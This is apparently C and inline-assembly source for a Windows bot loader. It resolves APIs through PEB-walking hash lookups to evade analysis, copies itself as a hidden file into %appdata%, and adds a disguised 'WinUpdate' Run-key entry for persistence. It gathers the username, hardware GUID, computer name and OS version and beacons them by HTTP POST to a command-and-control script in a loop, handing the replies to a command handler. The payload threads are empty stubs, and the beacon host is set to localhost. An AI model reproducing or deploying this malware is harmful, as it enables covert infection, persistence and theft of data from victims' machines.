#include "stdafx.h"
#include "loader.h"
#define MAX 0x4000 //max heap req
#define pingCount 12000 //seconds * (random 0-255)
DWORD CWA(...);
DWORD gpr(...);
DWORD getdll(...);
DWORD lpstrlenA(LPWSTR );
DWORD lpstrlenW(LPWSTR );
BYTE random();
BYTE randomize();
BOOL registryStartup(LPWSTR ,DWORD );
int prologue(LPVOID );
char Hex_Char(char );
void urlencode(LPSTR );
void Fillknockparam(LPVOID ,LPSTR );
BOOL Commands(LPBYTE ,DWORD );
BOOL http_alive(LPVOID ,LPCSTR );
void grabber();
void start();
void start2();
void start3();
void start4();

int WinMainCRTStartup()
{
	DWORD base;
	__asm
	{
		call next
next:
		pop eax
		sub eax,0xb
		mov base,eax
	}
	base = base - ((DWORD)WinMainCRTStartup - (DWORD)CWA);
	DWORD start_addr=base+((DWORD)start-(DWORD)CWA);
	DWORD start2_addr=base+((DWORD)start2-(DWORD)CWA);
	DWORD start3_addr=base+((DWORD)start3-(DWORD)CWA);
	DWORD start4_addr=base+((DWORD)start4-(DWORD)CWA);
	DWORD grabber_addr=base+((DWORD)grabber-(DWORD)CWA);
	//chunk of readwrite mem allocated for GPA
	LPVOID chunk=(LPVOID)CWA(VirtualAlloc,kernel32,0,MAX,0x3000,0x04);
	if(chunk == NULL)
	{
		return 0;
	}
	char _user32[]={'u','s','e','r','3','2','.','d','l','l',0x00};
	char _advapi32[]={'a','d','v','a','p','i','3','2','.','d','l','l',0x00};
	char _wininet[]={'w','i','n','i','n','e','t','.','d','l','l',0x00};
	CWA(LoadLibraryA,kernel32,_user32);
	CWA(LoadLibraryA,kernel32,_advapi32);
	CWA(LoadLibraryA,kernel32,_wininet);
	
	
	prologue(chunk); 
	
	
	
	
	//replicate to %appdata% and exec
	//prologue function advances to chunk+0x654
	
	CWA(CreateThread,kernel32,0,0,(LPTHREAD_START_ROUTINE)start_addr,0,0,0);
	CWA(Sleep,kernel32,1000);
	CWA(CreateThread,kernel32,0,0,(LPTHREAD_START_ROUTINE)start2_addr,0,0,0);
	CWA(Sleep,kernel32,1000);
	CWA(CreateThread,kernel32,0,0,(LPTHREAD_START_ROUTINE)start3_addr,0,0,0);
	CWA(Sleep,kernel32,1000);
	CWA(CreateThread,kernel32,0,0,(LPTHREAD_START_ROUTINE)start4_addr,0,0,0);
	CWA(Sleep,kernel32,1000);
	CWA(CreateThread,kernel32,0,0,(LPTHREAD_START_ROUTINE)grabber_addr,0,0,0);
	
	LPWSTR path=(LPWSTR)chunk+0x200;
	registryStartup(path,lpstrlenW(path));
	
	char site[]={'l','o','c','a','l','h','o','s','t',0x00};
	http_alive(chunk,site);
	//http_alive advances to chunk+0x1500
	//free up chunk
	CWA(VirtualFree,chunk,0,0x8000);
	return 0;
}


__declspec (naked) DWORD gpr(...)
{
	__asm
{	
		;returns address of function in eax
		;[esp+4] should be base of dll
		;[esp+8] should be funchash
		xor edi,edi
	rerun:
		mov eax,[esp+0x4]
		xor ebx,ebx
		add bx,[eax+0x3c]
		add eax,ebx ;eax= address of "PE"
		xor bx,bx
		add eax,0x78
		mov eax,[eax]     ;eax= EAT RVA
		add eax,[esp+0x4] ;eax= EAT VA
		cmp edi,[esp+8]
		je backagain
		mov ebx,[eax+0x20] ;ebx= aon RVA
		add ebx,[esp+0x4]  ;ebx=aon VA
		mov ecx,[eax+0x18] ;ecx=number of func
		xor edx,edx
		xor eax,eax
	
		sub ebx,4
	
	back:
		test ecx,ecx
		jz last
	
		add ebx,4
		add edx,2
	
		mov esi,[ebx] ;hash computing begins esi=string pointer till 0x00
		add esi,[esp+4]
	
		xor edi,edi
	genhash:
		xor eax,eax
		lodsb
		test al,al
		jz later
		ror edi,0xd
		add edi,eax
		jmp genhash
	later: ;edi holds hash now
		cmp edi,[esp+8]
		jne neee
		jmp rerun
	backagain: ;eax=EAT VA again
		mov ebx,[eax+0x24]
		add ebx,[esp+4]
		add ebx,edx
		xor ecx,ecx
		mov cx,[ebx]
		mov ebx,[eax+0x1c] ;ebx=aof rva
		add ebx,[esp+4] ;ebx=aof rva
		add ecx,ecx
		add ecx,ecx
		add ebx,ecx
		sub ebx,4
		mov ebx,[ebx]
		mov eax,[esp+4]
		add eax,ebx
		jmp last
	neee:
		xor eax,eax
		dec ecx
		jmp back
	last:
		pop ebx
		pop ecx
		pop edx
		jmp ebx
}
}
__declspec (naked) DWORD getdll(...)
{
	__asm
	{
	 ;returns dll base in eax until hash [esp+4] is found
		xor ecx,ecx
		mov cl,30h
		mov ecx,fs:[ecx]
		mov ecx,[ecx+0ch]
		mov ecx,[ecx+14h]
l1:
		mov esi,ecx
		mov esi,[esi+28h] ;esi contains unicode string
		cmp esi,0
		jz last1
		xor ebx,ebx
		xor eax,eax
genhash1:
		lodsb
		cmp al,0x60
		jg lm1
		cmp al,0x40
		jl lm1
		add al,0x20
lm1:
		test al,al
		jz late
		ror ebx,0xd
		add ebx,eax
		inc esi
		jmp genhash1
late:
		cmp ebx,[esp+4]
		je l3
		mov ecx,[ecx]
		jmp l1
l3:
		mov eax,ecx
		mov eax,[eax+10h]
		retn  4
last1:
		mov eax,0
		retn 4
	}
}
__declspec (naked) DWORD CWA(...)
{
	__asm
	{

		push [esp+8]
		call getdll
		push [esp+4]
		push eax
		call gpr
		add esp,8
		mov ebx,[esp-8]
		add ebx,3
		mov [esp],ebx
		jmp eax
	
	}	
}

//returns randomized byte
DWORD lpstrlenW(LPWSTR arr1)
{
	int i;
	for(i=0;arr1[i]!=0&&arr1[i+1]!=0;i=i+2)
	{
	}
	return i;
}
DWORD lpstrlenA(LPSTR arr1)
{
	int i;
	for(i=0;arr1[i]!=0;i++)
	{
	}
	return i;
}
BYTE random()
{
	__asm
	{
		rdtsc
		movzx eax,al
	}
}
//returns randomized byte in alphanumeric Ascii range
BYTE randomize()
{
	BYTE temp;
	while(1)
	{
		temp = random();
		if(temp > 0x41 && temp < 0x5A)
			break;
		
		if(temp > 0x61 && temp < 0x7A)
			break;
	
		if(temp > 0x30 && temp < 0x39)
			break;	
	}
	return temp;
}

int prologue(LPVOID chunk)
{
	
	// single instance
	HANDLE mutex;
	BYTE randommutex[]={'i',0x00,'m',0x00,'p',0x00,'X',0x00,'X',0x00,'X',0x00,'X',0x00,'X',0x00,'X',0x00,'X',0x00,'X',0x00,'X',0x00,'X',0x00,0x00,0x00};
	mutex=(HANDLE)CWA(CreateMutexW,kernel32,NULL,0,randommutex);
	__asm
	{
		mov eax,dword ptr fs:[0x18]
		mov eax,dword ptr ds:[eax+0x34]
		cmp eax,0xB7
		je exit123
	}
	// file name generation
	LPWSTR arr=(LPWSTR)chunk;
	BYTE temp[]={'%',0x00,'a',0x00,'p',0x00,'p',0x00,'d',0x00,'a',0x00,'t',0x00,'a',0x00,'%',0x00,'\\',0x00,0x00,0x00};
	BYTE filename[]={'i',0x00,'m',0x00,'p',0x00,'.',0x00,'e',0x00,'x',0x00,'e',0x00,0x00,0x00};
	CWA(lstrcpyW,kernel32,arr,temp);
	CWA(lstrcatW,kernel32,arr,filename);
	LPWSTR path=(LPWSTR)chunk+0x200;
	LPWSTR path2=(LPWSTR)chunk+0x400;
	CWA(ExpandEnvironmentStringsW,kernel32,arr,path,0x200);
	__asm
		{
			mov eax,fs:[0x30]
			mov eax,[eax+0x10]
			mov eax,[eax+0x3c]
			mov [path2],eax
		}

	// present at desired location?
	if(CWA(lstrcmpW,kernel32,path, path2))
	{
		HANDLE hFile,hFile2;
		hFile = (HANDLE)CWA(CreateFileW,kernel32,path2,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
		if(hFile == INVALID_HANDLE_VALUE)
		{
			goto exit;
		}
		hFile2 = (HANDLE)CWA(CreateFileW,kernel32,path,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
		if(hFile2 == INVALID_HANDLE_VALUE)
		{
			hFile2 =	(HANDLE)CWA(CreateFileW,kernel32,path,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
			if(hFile2 == INVALID_HANDLE_VALUE)
			{
				CWA(CloseHandle,kernel32,hFile);
				goto exit;
			}
			DWORD length=CWA(GetFileSize,kernel32,hFile,NULL);
			DWORD pd;
			LPBYTE data=(LPBYTE)CWA(VirtualAlloc,kernel32,0,length,0x3000,0x04);
			if(data == NULL)
			{
				CWA(CloseHandle,kernel32,hFile2);
				CWA(CloseHandle,kernel32,hFile);
				goto exit;
			}
			CWA(ReadFile,kernel32,hFile,data,length,&pd,NULL);
			CWA(WriteFile,kernel32,hFile2,data,length,&pd,NULL);
			CWA(CloseHandle,kernel32,hFile);
			CWA(CloseHandle,kernel32,hFile2);
			CWA(VirtualFree,kernel32,data,0,0x8000);
		}
		else
		{
			CWA(CloseHandle,kernel32,hFile);
			CWA(CloseHandle,kernel32,hFile2);
		}
		PROCESS_INFORMATION *piinfo; //size = 0x10
		STARTUPINFO *siinfo;         //size = 0x44
		__asm
		{
			mov eax,chunk
			add eax,0x600
			mov piinfo,eax
			add eax,0x10
			mov siinfo,eax
			mov ecx,0x10
			mov edx,0x44
			mov edi,piinfo
			mov esi,siinfo
back1:
			mov byte ptr es:[edi],0
			dec ecx
			inc edi
			test ecx,ecx
			jnz back1
back2:
			mov byte ptr es:[esi],0
			dec edx
			inc esi
			test edx,edx
			jnz back2
		}

		CWA(ReleaseMutex,kernel32,mutex);
		CWA(CreateProcessW,kernel32,0,path,0,0,0,DETACHED_PROCESS,0,0,siinfo,piinfo);
		CWA(TerminateProcess,kernel32,(HANDLE)-1,0);
	}
	else
	{
		return 1;
	}
	__asm
	{
		exit123:
	}
	exit:
	CWA(ReleaseMutex,kernel32,mutex);
	CWA(TerminateProcess,kernel32,(HANDLE)-1,0);
	return 0;
}
BOOL registryStartup(LPWSTR path,DWORD len)
{
 	HKEY reg;
	BYTE szPath[]={'S',0x00,'O',0x00,'F',0x00,'T',0x00,'W',0x00,'A',0x00,'R',0x00,'E',0x00,'\\',0x00,'M',0x00,'i',0x00,'c',0x00,'r',0x00,'o',0x00,'s',0x00,'o',0x00,'f',0x00,'t',0x00,'\\',0x00,'W',0x00,'i',0x00,'n',0x00,'d',0x00,'o',0x00,'w',0x00,'s',0x00,'\\',0x00,'C',0x00,'u',0x00,'r',0x00,'r',0x00,'e',0x00,'n',0x00,'t',0x00,'V',0x00,'e',0x00,'r',0x00,'s',0x00,'i',0x00,'o',0x00,'n',0x00,'\\',0x00,'R',0x00,'u',0x00,'n',0x00,0x00,0x00};
	BYTE keyname[]={'W',0x00,'i',0x00,'n',0x00,'U',0x00,'p',0x00,'d',0x00,'a',0x00,'t',0x00,'e',0x00,0x00,0x00};
	if(CWA(RegCreateKeyExW,advapi32,HKEY_CURRENT_USER,szPath, 0, 0,REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &reg, 0) == ERROR_SUCCESS)
	{
		CWA(RegSetValueExW,advapi32,reg, (LPCWSTR)keyname, 0, REG_MULTI_SZ, (LPBYTE)path, len*2);
		CWA(RegCloseKey,advapi32,reg);
		return 1;
	}
	return 0;
}

#include<WinInet.h>
char Hex_Char(char Code)
{
	char hex[] = {'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f',0x00};
	return hex[Code & 0xF];
}
void urlencode(LPSTR url)
{
	LPSTR final=(LPSTR)CWA(VirtualAlloc,kernel32,0,0x200,0x3000,0x04);
	int size=0;
	int i,j;
	i=0;
	j=0;
	while(url[i]!='\0')
	{
		if((url[i] >= 'a' && url[i] <='z')||(url[i] >= 'A' && url[i] <='Z')||(url[i] >= '0' && url[i] <='9')||url[i] == '=')
		{
			final[j]=url[i];
			size=size+1;
			i=i+1;
			j=j+1;
		}
		else
		{
			final[j]='%';
			final[j+1]=Hex_Char((url[i] & 0xF0 )/ 0x10);
			final[j+2]=Hex_Char(url[i] & 0x0F);
			size=size+3;
			i=i+1;
			j=j+3;
		}
	}
	CWA(lstrcpyA,kernel32,url,final);
	CWA(VirtualFree,kernel32,final,0,0x8000);
}
void Fillknockparam(LPVOID chunk,LPSTR str)
{
	LPSTR username=(LPSTR)chunk+0x2000;
	DWORD size=0x25;
	char _b32[]={'3','2',0x00};
	char _b64[]={'6','4',0x00};
	char ver[]={'1','.','0','.','0',0x00};
	LPSTR UID=(LPSTR)chunk+0x2050;
	LPSTR version=(LPSTR)chunk+0x2100;
	LPSTR computer=(LPSTR)chunk+0x2120;
	LPSTR bits=(LPSTR)chunk+0x2190;
	LPSTR windows=(LPSTR)chunk+0x2200;
	LPSTR end=(LPSTR)chunk+0x2360;
	BOOL sec=1;
	CWA(GetUserNameA,advapi32,username,&size);
	urlencode(username);
	CWA(GetCurrentHwProfileA,advapi32,(LPHW_PROFILE_INFOA)UID);
	CWA(lstrcpyA,kernel32,end,UID+4);
	urlencode(UID+4);
	CWA(lstrcpyA,kernel32,version,ver);
	urlencode(version);
	size=0x25;
	CWA(GetComputerNameA,kernel32,computer,&size);
	urlencode(computer);
	__asm
		{
			mov eax,fs:[0xc0]
			test eax,eax
			jz Bits32
		}
	CWA(lstrcpyA,kernel32,bits,_b64);
	goto next;
Bits32:
	CWA(lstrcpyA,kernel32,bits,_b32);
next:
	((LPOSVERSIONINFOA)windows)->dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	CWA(GetVersionExW,kernel32,(LPOSVERSIONINFOW)windows);
	BYTE minor=(BYTE)((LPOSVERSIONINFOA)windows)->dwMinorVersion;
	BYTE major=(BYTE)((LPOSVERSIONINFOA)windows)->dwMajorVersion;

	char t1[]={'2','%','%','2','e','%','d','%','%','2','e','%','d',0x00};
	CWA(wsprintfA,user32,windows,t1,major,minor);

	char t2[]={'u','s','e','r','=',0x00};
	CWA(lstrcpyA,kernel32,str,t2);
	CWA(lstrcatA,kernel32,str,username);
	
	char t3[]={'&','g','u','i','d','=',0x00};
	CWA(lstrcatA,kernel32,str,t3);
	CWA(lstrcatA,kernel32,str,UID+4);
	
	char t4[]={'&','v','e','r','=',0x00};
	CWA(lstrcatA,kernel32,str,t4);
	CWA(lstrcatA,kernel32,str,version);
	
	char t5[]={'&','c','p','=',0x00};
	CWA(lstrcatA,kernel32,str,t5);
	CWA(lstrcatA,kernel32,str,computer);
	
	char t6[]={'&','a','r','c','h','=',0x00};
	CWA(lstrcatA,kernel32,str,t6);
	CWA(lstrcatA,kernel32,str,bits);

	char t7[]={'&','w','i','n','=',0x00};
	CWA(lstrcatA,kernel32,str,t7);
	CWA(lstrcatA,kernel32,str,windows);
}
BOOL Commands(LPBYTE command,DWORD size)
{
	
	CWA(Sleep,kernel32,100);
	return 1;
}
BOOL http_alive(LPVOID chunk,LPCSTR domain)
{
	LPSTR userAgent=(LPSTR)chunk+0x654;
	LPSTR szHeaders=(LPSTR)chunk+0x750;
	LPSTR szReq=(LPSTR)chunk+0x800;
	LPSTR szBuffer=(LPSTR)chunk+0x1000;
	int counter=5;
	char ua[]={'M','o','z','i','l','l','a','/','5','.','0',' ','(','W','i','n','d','o','w','s',' ','N','T',' ','6','.','1',';',' ','W','O','W','6','4',')',' ','A','p','p','l','e','W','e','b','K','i','t','/','5','3','7','.','3','6',' ','(','K','H','T','M','L',',',' ','l','i','k','e',' ','G','e','c','k','o',')',' ','C','h','r','o','m','e','/','2','9','.','0','.','1','5','4','7','.','6','2',' ','S','a','f','a','r','i','/','5','3','7','.','3','6',0x00};
	char hs[]={'C','o','n','t','e','n','t','-','T','y','p','e',':',' ','a','p','p','l','i','c','a','t','i','o','n','/','x','-','w','w','w','-','f','o','r','m','-','u','r','l','e','n','c','o','d','e','d',0x00};
	CWA(lstrcpyA,kernel32,userAgent,ua);
	CWA(lstrcpyA,kernel32,szHeaders,hs);
	DWORD count;
	DWORD dwRead;
	char alive_php_file[]={'/','i','m','p','/','i','n','d','e','x','.','p','h','p',0x00};	
		//filling up data to be sent for knocking

		Fillknockparam(chunk,szReq);
		char post[]={'P','O','S','T',0x00};
	while(TRUE)
	{
		count = pingCount *random();
		HINTERNET session=(HINTERNET)CWA(_InternetOpenA,wininet,userAgent,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
		if(session == NULL)
		{
			goto end;
		}
		HINTERNET http=(HINTERNET)CWA(_InternetConnectA,wininet,session,domain,80,0,0,INTERNET_SERVICE_HTTP,0,0);
		if(http == NULL)
		{
			CWA(_InternetCloseHandle,wininet,session);
			goto end;
		}
		HINTERNET hHttpRequest = (HINTERNET)CWA(_HttpOpenRequestA,wininet,http,post,alive_php_file,0,0,0,INTERNET_FLAG_RELOAD,0);
		if(hHttpRequest == NULL)
		{
			CWA(_InternetCloseHandle,wininet,session);
			CWA(_InternetCloseHandle,wininet,http);
			goto end;
		}
		if(CWA(_HttpSendRequestA,wininet,hHttpRequest, szHeaders, lpstrlenA(szHeaders), szReq, lpstrlenA(szReq))!=0)
		{
			CWA(_InternetReadFileA,wininet,hHttpRequest, szBuffer, 0x400, &dwRead);
			if(dwRead)
			Commands((LPBYTE)szBuffer,dwRead);
		}
		CWA(_InternetCloseHandle,wininet,hHttpRequest);
		CWA(_InternetCloseHandle,wininet,session);
		CWA(_InternetCloseHandle,wininet,http);
end:
		counter --;
		CWA(Sleep,kernel32,random()*count);
		if(counter == 0)
		{
			CWA(Sleep,kernel32,random()*count*2);
			counter = 5;
		}
	}
}
//main working and stuff starts
//starts gets called 4 times use wisely
void grabber()
{

	CWA(Sleep,kernel32,10000);
}
void start() 
{
	CWA(Sleep,kernel32,10000);
}
void start2() 
{
	CWA(Sleep,kernel32,10000);
}
void start3() 
{
	CWA(Sleep,kernel32,10000);
}
void start4() 
{
	CWA(Sleep,kernel32,10000);
}
/* xport
extern "C" __declspec( dllexport ) int func()
{
	MessageBox(0,0,0,0);
	return 0; 
}
*/
/* naked
__declspec (naked) void func()
{
 __asm
 {
  mov eax,1
  call 0x401290
 }
}
*/
